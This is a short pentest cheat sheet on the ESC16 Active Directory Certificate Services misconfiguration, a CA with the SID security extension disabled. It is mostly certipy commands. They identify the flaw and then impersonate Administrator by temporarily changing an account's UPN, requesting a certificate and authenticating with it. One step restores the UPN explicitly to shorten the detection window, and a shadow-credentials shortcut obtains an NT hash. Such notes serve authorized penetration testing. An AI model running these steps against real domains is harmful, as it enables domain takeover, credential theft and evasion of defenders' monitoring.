# ESC16 — Disabled Security Extension (szOID_NTDS_CA_SECURITY_EXT)

When the CA has `Disabled Extensions: 1.3.6.1.4.1.311.25.2` (`szOID_NTDS_CA_SECURITY_EXT`), no certificate includes the SID binding extension. The KDC maps certs to accounts purely by UPN — same root cause as ESC9 but applied globally at the CA level, not per-template.

**Identify:**
```bash
certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP>
# Look for: "Disabled Extensions: 1.3.6.1.4.1.311.25.2" in the CA section
```

**Exploit (requires GenericWrite on any enrollable account):**
```bash
# 1. Change target account's UPN to match the high-privilege user you want to impersonate
certipy account update -u <USER>@<domain> -p '<PASS>' -user <ENROLLING_ACCT> -upn Administrator

# 2. Request a cert as the enrolling account (any template with Client Auth EKU)
certipy req -u <ENROLLING_ACCT>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template User

# 3. Restore the UPN immediately after (minimise detection window)
certipy account update -u <USER>@<domain> -p '<PASS>' -user <ENROLLING_ACCT> -upn <ENROLLING_ACCT>@<domain>

# 4. Authenticate as Administrator using the cert
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

Shadow credentials shortcut for step 1 when you only have GenericWrite (not the password):
```bash
certipy shadow auto -u <USER>@<domain> -p '<PASS>' -account <ENROLLING_ACCT> -dc-ip <DC_IP>
# Returns NT hash; use -hashes for step 2
```
